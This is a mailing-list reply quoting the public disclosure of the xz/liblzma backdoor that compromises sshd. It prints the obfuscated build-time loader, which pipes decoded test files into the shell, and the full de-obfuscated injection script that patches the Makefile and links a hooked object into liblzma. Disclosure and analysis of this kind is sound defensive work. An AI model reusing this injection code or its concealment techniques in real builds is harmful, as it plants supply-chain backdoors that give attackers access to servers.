@@ -1,0 +1,539 @@
+
+Date: Fri, 29 Mar 2024 19:54:14 +0100
+From: Ivan Delalande <colona@....fr>
+To: oss-security@...ts.openwall.com, Andres Freund <andres@...razel.de>,
+	Andrew Morton <akpm@...ux-foundation.org>
+Subject: Re: backdoor in upstream xz/liblzma leading to ssh
+ server compromise
+
+On Fri, Mar 29, 2024 at 08:51:26AM -0700, Andres Freund wrote:
+> For which the exploit code was then adjusted:
+> https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
+> 
+> Given the activity over several weeks, the committer is either directly
+> involved or there was some quite severe compromise of their
+> system. Unfortunately the latter looks like the less likely explanation, given
+> they communicated on various lists about the "fixes" mentioned above.
+
+Knowing this, I hope the recent kernel patch series involving the same
+person to some degree will get extra scrutiny:
+https://lore.kernel.org/lkml/20240320183846.19475-1-lasse.collin@tukaani.org/t/
+
+Thanks Andres, incredible find and write-up!
+
+
+On Fri, Mar 29, 2024 at 08:51:26AM -0700, Andres Freund wrote:
+> After observing a few odd symptoms around liblzma (part of the xz package) on
+> Debian sid installations over the last weeks (logins with ssh taking a lot of
+> CPU, valgrind errors) I figured out the answer:
+> 
+> The upstream xz repository and the xz tarballs have been backdoored.
+> 
+> At first I thought this was a compromise of debian's package, but it turns out
+> to be upstream.
+> 
+> 
+> == Compromised Release Tarball ==
+> 
+> One portion of the backdoor is *solely in the distributed tarballs*. For
+> easier reference, here's a link to debian's import of the tarball, but it is
+> also present in the tarballs for 5.6.0 and 5.6.1:
+> 
+> https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63
+> 
+> That line is *not* in the upstream source of build-to-host, nor is
+> build-to-host used by xz in git.  However, it is present in the tarballs
+> released upstream, except for the "source code" links, which I think github
+> generates directly from the repository contents:
+> 
+> https://github.com/tukaani-project/xz/releases/tag/v5.6.0
+> https://github.com/tukaani-project/xz/releases/tag/v5.6.1
+> 
+> 
+> This injects an obfuscated script to be executed at the end of configure. This
+> script is fairly obfuscated and data from "test" .xz files in the repository.
+> 
+> 
+> This script is executed and, if some preconditions match, modifies
+> $builddir/src/liblzma/Makefile to contain
+> 
+> am__test = bad-3-corrupt_lzma2.xz
+> ...
+> am__test_dir=$(top_srcdir)/tests/files/$(am__test)
+> ...
+> sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
+> 
+> 
+> which ends up as
+> ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
+> 
+> Leaving out the "| bash" that produces
+> 
+> ####Hello####
+> #��Z�.hj�
+> eval `grep ^srcdir= config.status`
+> if test -f ../../config.status;then
+> eval `grep ^srcdir= ../../config.status`
+> srcdir="../../$srcdir"
+> fi
+> export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
+> ####World####
+> 
+> After de-obfuscation this leads to the attached injected.txt.
+> 
+> 
+> == Compromised Repository ==
+> 
+> The files containing the bulk of the exploit are in an obfuscated form in
+>   tests/files/bad-3-corrupt_lzma2.xz
+>   tests/files/good-large_compressed.lzma
+> committed upstream. They were initially added in
+> https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0
+> 
+> Note that the files were not even used for any "tests" in 5.6.0.
+> 
+> 
+> Subsequently the injected code (more about that below) caused valgrind errors
+> and crashes in some configurations, due the stack layout differing from what
+> the backdoor was expecting.  These issues were attempted to be worked around
+> in 5.6.1:
+> 
+> https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad
+> https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f
+> https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92
+> 
+> For which the exploit code was then adjusted:
+> https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
+> 
+> Given the activity over several weeks, the committer is either directly
+> involved or there was some quite severe compromise of their
+> system. Unfortunately the latter looks like the less likely explanation, given
+> they communicated on various lists about the "fixes" mentioned above.
+> 
+> 
+> Florian Weimer first extracted the injected code in isolation, also attached,
+> liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
+> 
+> 
+> == Affected Systems ==
+> 
+> The attached de-obfuscated script is invoked first after configure, where it
+> decides whether to modify the build process to inject the code.
+> 
+> These conditions include targeting only x86-64 linux:
+>     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
+> 
+> Building with gcc and the gnu linker
+>     if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
+>     exit 0
+>     fi
+>     if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
+>     exit 0
+>     fi
+>     LDv=$LD" -v"
+>     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
+>     exit 0
+> 
+> Running as part of a debian or RPM package build:
+>     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
+> 
+> Particularly the latter is likely aimed at making it harder to reproduce the
+> issue for investigators.
+> 
+> 
+> Due to the working of the injected code (see below), it is likely the backdoor
+> can only work on glibc based systems.
+> 
+> 
+> Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
+> distributions, and where they have, mostly in pre-release versions.
+> 
+> 
+> == Observing Impact on openssh server ==
+> 
+> With the backdoored liblzma installed, logins via ssh become a lot slower.
+> 
+> time ssh nonexistant@...alhost
+> 
+> before:
+> nonexistant@...alhost: Permission denied (publickey).
+> 
+> before:
+> real	0m0.299s
+> user	0m0.202s
+> sys	0m0.006s
+> 
+> after:
+> nonexistant@...alhost: Permission denied (publickey).
+> 
+> real	0m0.807s
+> user	0m0.202s
+> sys	0m0.006s
+> 
+> 
+> openssh does not directly use liblzma. However debian and several other
+> distributions patch openssh to support systemd notification, and libsystemd
+> does depend on lzma.
+> 
+> 
+> Initially starting sshd outside of systemd did not show the slowdown, despite
+> the backdoor briefly getting invoked. This appears to be part of some
+> countermeasures to make analysis harder.
+> 
+> Observed requirements for the exploit:
+> a) TERM environment variable is not set
+> b) argv[0] needs to be /usr/sbin/sshd
+> c) LD_DEBUG, LD_PROFILE are not set
+> d) LANG needs to be set
+> e) Some debugging environments, like rr, appear to be detected. Plain gdb
+>    appears to be detected in some situations, but not others
+> 
+> To reproduce outside of systemd, the server can be started with a clear
+> environment, setting only the required variable:
+> 
+> env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
+> 
+> 
+> In fact, openssh does not need to be started as a server to observe the
+> slowdown:
+> 
+> slow:
+> env -i LANG=C /usr/sbin/sshd -h
+> 
+> (about 0.5s on my older system)
+> 
+> 
+> fast:
+> env -i LANG=C TERM=foo /usr/sbin/sshd -h
+> env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
+> ...
+> 
+> (about 0.01s on the same system)
+> 
+> 
+> It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
+> are obviously lots of servers linking to libsystemd.
+> 
+> 
+> == Analyzing the injected code ==
+> 
+> I am *not* a security researcher, nor a reverse engineer.  There's lots of
+> stuff I have not analyzed and most of what I observed is purely from
+> observation rather than exhaustively analyzing the backdoor code.
+> 
+> To analyze I primarily used "perf record -e intel_pt//ub" to observe where
+> execution diverges between the backdoor being active and not. Then also gdb,
+> setting breakpoints before the divergence.
+> 
+> 
+> The backdoor initially intercepts execution by replacing the ifunc resolvers
+> crc32_resolve(), crc64_resolve() with different code, which calls
+> _get_cpuid(), injected into the code (which previously would just be static
+> inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
+> symbol names.
+> 
+> These functions get resolved during startup, because sshd is built with
+> -Wl,-z,now, leading to all symbols being resolved early. If started with
+> LD_BIND_NOT=1 the backdoor does not appear to work.
+> 
+> 
+> Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
+> 'completed' variable is 0 and increments it, returning the normal cpuid result
+> (via a new _cpuid()). It gets to be more interesting during crc64_resolve().
+> 
+> In the second invocation crc64_resolve() appears to find various information,
+> like data from the dynamic linker, program arguments and environment. Then it
+> perform various environment checks, including those above. There are other
+> checks I have not fully traced.
+> 
+> If the above decides to continue, the code appears to be parsing the symbol
+> tables in memory. This is the quite slow step that made me look into the issue.
+> 
+> 
+> Notably liblzma's symbols are resolved before many of the other libraries,
+> including the symbols in the main sshd binary.  This is important because
+> symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.
+> 
+> 
+> To be able to resolve symbols in libraries that have not yet loaded, the
+> backdoor installs an audit hook into the dynamic linker, which can be observed
+> with gdb using
+>   watch _rtld_global_ro._dl_naudit
+> It looks like the audit hook is only installed for the main binary.
+> 
+> That hook gets called, from _dl_audit_symbind, for numerous symbols in the
+> main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
+> resolved.  When called for that symbol, the backdoor changes the value of
+> RSA_public_decrypt@....plt to point to its own code.  It does not do this via
+> the audit hook mechanism, but outside of it.
+> 
+> For reasons I do not yet understand, it does change sym.st_value *and* the
+> return value of from the audit hook to a different value, which leads
+> _dl_audit_symbind() to do nothing - why change anything at all then?
+> 
+> After that the audit hook is uninstalled again.
+> 
+> It is possible to change the got.plt contents at this stage because it has not
+> (and can't yet) been remapped to be read-only.
+> 
+> 
+> I suspect there might be further changes performed at this stage.
+> 
+> 
+> == Impact on sshd ==
+> 
+> The prior section explains that RSA_public_decrypt@....plt was redirected to
+> point into the backdoor code. The trace I was analyzing indeed shows that
+> during a pubkey login the exploit code is invoked:
+> 
+>             sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)
+> 
+> The backdoor then calls back into libcrypto, presumably to perform normal authentication
+> 
+>             sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
+> 
+> 
+> I have not yet analyzed precisely what is being checked for in the injected
+> code, to allow unauthorized access. Since this is running in a
+> pre-authentication context, it seems likely to allow some form of access or
+> other form of remote code execution.
+> 
+> I'd upgrade any potentially vulnerable system ASAP.
+> 
+> 
+> == Bug reports ==
+> 
+> Given the apparent upstream involvement I have not reported an upstream
+> bug. As I initially thought it was a debian specific issue, I sent a more
+> preliminary report to security@...ian.org.  Subsequently I reported the issue
+> to distros@. CISA was notified by a distribution.
+> 
+> Red Hat assigned this issue CVE-2024-3094.
+> 
+> 
+> == Detecting if installation is vulnerable ==
+> 
+> Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
+> system is vulnerable, attached here. Thanks!
+> 
+> 
+> Greetings,
+> 
+> Andres Freund
+
+> P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
+> C="pic_flag=\" $P\""
+> O="^pic_flag=\" -fPIC -DPIC\"$"
+> R="is_arch_extension_supported"
+> x="__get_cpuid("
+> p="good-large_compressed.lzma"
+> U="bad-3-corrupt_lzma2.xz"
+> eval $zrKcVq
+> if test -f config.status; then
+> eval $zrKcSS
+> eval `grep ^LD=\'\/ config.status`
+> eval `grep ^CC=\' config.status`
+> eval `grep ^GCC=\' config.status`
+> eval `grep ^srcdir=\' config.status`
+> eval `grep ^build=\'x86_64 config.status`
+> eval `grep ^enable_shared=\'yes\' config.status`
+> eval `grep ^enable_static=\' config.status`
+> eval `grep ^gl_path_map=\' config.status`
+> eval $zrKccj
+> if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
+> exit 0
+> fi
+> if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
+> exit 0
+> fi
+> if test "x$enable_shared" != "xyes";then
+> exit 0
+> fi
+> if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
+> exit 0
+> fi
+> if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
+> exit 0
+> fi
+> if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
+> exit 0
+> fi
+> if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
+> exit 0
+> fi
+> if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
+> exit 0
+> fi
+> if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
+> exit 0
+> fi
+> if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
+> exit 0
+> fi
+> LDv=$LD" -v"
+> if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
+> exit 0
+> fi
+> if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
+> exit 0
+> fi
+> if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
+> exit 0
+> fi
+> if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
+> eval $zrKcst
+> j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
+> if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> z="^am__uninstall_files_from_dir = {"
+> if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> w="^am__install_max ="
+> if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> E=$z
+> if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> Q="^am__vpath_adj_setup ="
+> if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> M="^am__include = include"
+> if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> L="^all: all-recursive$"
+> if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
+> if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
+> if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> if ! grep -qs "$O" libtool > /dev/null 2>&1;then
+> exit 0
+> fi
+> eval $zrKcTy
+> b="am__test = $U"
+> sed -i "/$j/i$b" src/liblzma/Makefile || true
+> d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
+> b="am__strip_prefix = $d"
+> sed -i "/$w/i$b" src/liblzma/Makefile || true
+> b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
+> sed -i "/$E/i$b" src/liblzma/Makefile || true
+> b="\$(top_srcdir)/tests/files/\$(am__test)"
+> s="am__test_dir=$b"
+> sed -i "/$Q/i$s" src/liblzma/Makefile || true
+> h="-Wl,--sort-section=name,-X"
+> if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
+> h=$h",-z,now"
+> fi
+> j="liblzma_la_LDFLAGS += $h"
+> sed -i "/$L/i$j" src/liblzma/Makefile || true
+> sed -i "s/$O/$C/g" libtool || true
+> k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
+> sed -i "s/$u/$k/" src/liblzma/Makefile || true
+> l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
+>     export top_srcdir='\$(top_srcdir)'; \\\\\n\
+>     export CC='\$(CC)'; \\\\\n\
+>     export DEFS='\$(DEFS)'; \\\\\n\
+>     export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
+>     export INCLUDES='\$(INCLUDES)'; \\\\\n\
+>     export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
+>     export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
+>     export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
+>     export CFLAGS='\$(CFLAGS)'; \\\\\n\
+>     export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
+>     export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
+>     export libdir='\$(libdir)'; \\\\\n\
+>     export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
+>     export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
+> sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
+> sed -i "/$m/i$l" src/liblzma/Makefile || true
+> eval $zrKcHD
+> fi
+> elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
+> eval $zrKcKQ
+> if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
+> exit 0
+> fi
+> if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
+> exit 0
+> fi
+> if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
+> exit 0
+> fi
+> if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
+> exit 0
+> fi
+> if ! grep -qs "$C" ../../libtool; then
+> exit 0
+> fi
+> if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
+> exit 0
+> fi
+> if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
+> exit 0
+> fi
+> N=0
+> W=0
+> Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
+> eval $zrKcjv
+> if test -z "$Y"; then
+> N=0
+> W=88792
+> else
+> N=88792
+> W=0
+> fi
+> xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
+> if ! test -f liblzma_la-crc64-fast.o; then
+> exit 0
+> fi
+> cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
+> V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
+> eval $yosA
+> if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
+> sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
+> sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
+> $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
+> cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
+> eval $BPep
+> if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
+> sed "/include \"crc32_arm64.h\"/a \\$V" | \
+> sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
+> $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
+> eval $RgYB
+> if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
+> if test ! -f .libs/liblzma.so; then
+> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+> fi
+> rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
+> else
+> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+> fi
+> rm -f .libs/liblzma_la-crc32-fast.o || true
+> rm -f .libs/liblzma_la-crc64-fast.o || true
+> else
+> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+> fi
+> else
+> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+> fi
+> rm -f liblzma_la-crc64-fast.o || true
+> fi
+> eval $DHLd
+
+-- 
+Ivan Delalande
